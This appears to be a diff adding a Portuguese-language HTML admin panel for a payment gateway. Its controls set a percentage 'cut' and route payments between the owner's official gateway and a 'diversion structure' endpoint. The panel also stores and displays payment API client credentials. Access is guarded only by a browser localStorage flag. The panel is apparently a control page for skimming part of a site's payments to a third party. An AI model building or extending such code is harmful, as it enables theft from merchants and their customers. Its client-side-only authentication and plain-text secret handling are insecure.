@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <title>Painel ADMIN Gateway</title>
+  <script>
+    if (localStorage.getItem('autenticado') !== 'true') {
+      window.location.href = 'login.html';
+    }
+  </script>
+</head>
+<body class="bg-gray-900 text-white min-h-screen p-4">
+  <div class="max-w-2xl mx-auto bg-gray-800 p-8 rounded-xl shadow-lg">
+    <div class="flex justify-between items-center mb-6">
+      <h1 class="text-2xl font-bold text-green-400">Painel ADMIN Gateway</h1>
+      <div class="space-x-2">
+        <button onclick="mostrarAba('config')" class="px-4 py-2 bg-blue-700 hover:bg-blue-600 rounded">Configurações</button>
+        <button onclick="mostrarAba('cred')" class="px-4 py-2 bg-purple-700 hover:bg-purple-600 rounded">Credenciais</button>
+      </div>
+    </div>
+
+    <div id="aba-config">
+      <label class="block mb-4">
+        Porcentagem de corte (0 a 99)
+        <input id="chance" type="number" min="0" max="99" class="w-full mt-1 p-2 rounded bg-gray-700 border border-gray-600" />
+      </label>
+
+      <label class="block mb-4">
+        🟢 Gateway favorecida:
+        <select id="estrutura1" class="w-full mt-1 p-2 rounded bg-gray-700 border border-gray-600">
+          <option value="pagamento.php">Oficial - Dono</option>
+          <option value="deposito/pgp.php">Estrutura Desvio</option>
+        </select>
+      </label>
+
+      <label class="block mb-4">
+        🔴 Gateway Secundário:
+        <select id="estrutura2" class="w-full mt-1 p-2 rounded bg-gray-700 border border-gray-600">
+          <option value="pagamento.php">Oficial - Dono</option>
+          <option value="deposito/pgp.php">Estrutura Desvio</option>
+        </select>
+      </label>
+
+      <button onclick="salvarConfig()" class="w-full bg-green-600 hover:bg-green-500 font-bold py-2 rounded">Salvar Configuração</button>
+      <p id="status" class="text-center mt-4 text-sm text-yellow-400"></p>
+    </div>
+
+    <div id="aba-cred" class="hidden">
+      <label class="block mb-4">
+        Client ID:
+        <input id="clientId" type="text" class="w-full mt-1 p-2 rounded bg-gray-700 border border-gray-600" />
+      </label>
+
+      <label class="block mb-4">
+        Client Secret:
+        <input id="clientSecret" type="text" class="w-full mt-1 p-2 rounded bg-gray-700 border border-gray-600" />
+      </label>
+
+      <button onclick="salvarCredenciais()" class="w-full bg-purple-600 hover:bg-purple-500 font-bold py-2 rounded">Salvar Credenciais</button>
+      <p id="statusCred" class="text-center mt-4 text-sm text-yellow-400"></p>
+    </div>
+  </div>
+
+  <script>
+    function mostrarAba(aba) {
+      document.getElementById('aba-config').classList.add('hidden');
+      document.getElementById('aba-cred').classList.add('hidden');
+      document.getElementById('aba-' + aba).classList.remove('hidden');
+    }
+
+    async function carregarConfig() {
+      const res = await fetch('get-config.php');
+      const dados = await res.json();
+      document.getElementById('chance').value = Math.round(dados.chance * 100);
+      document.getElementById('estrutura1').value = dados.estrutura1;
+      document.getElementById('estrutura2').value = dados.estrutura2;
+    }
+
+    async function salvarConfig() {
+      const chance = parseInt(document.getElementById('chance').value) / 100;
+      const estrutura1 = document.getElementById('estrutura1').value;
+      const estrutura2 = document.getElementById('estrutura2').value;
+      const formData = new FormData();
+      formData.append('chance', chance);
+      formData.append('estrutura1', estrutura1);
+      formData.append('estrutura2', estrutura2);
+      const res = await fetch('save-config.php', { method: 'POST', body: formData });
+      const resultado = await res.json();
+      document.getElementById('status').innerText = resultado.sucesso ? "✅ Configurações salvas!" : "❌ Erro ao salvar";
+    }
+
+    async function carregarCredenciais() {
+      const res = await fetch('get-credenciais.php');
+      const dados = await res.json();
+      document.getElementById('clientId').value = dados.clientId;
+      document.getElementById('clientSecret').value = dados.clientSecret;
+    }
+
+    async function salvarCredenciais() {
+      const formData = new FormData();
+      formData.append('clientId', document.getElementById('clientId').value);
+      formData.append('clientSecret', document.getElementById('clientSecret').value);
+      const res = await fetch('save-credenciais.php', { method: 'POST', body: formData });
+      const resultado = await res.json();
+      document.getElementById('statusCred').innerText = resultado.sucesso ? "✅ Credenciais salvas!" : "❌ Erro ao salvar";
+    }
+
+    carregarConfig();
+    carregarCredenciais();
+  </script>
+</body>
+</html>
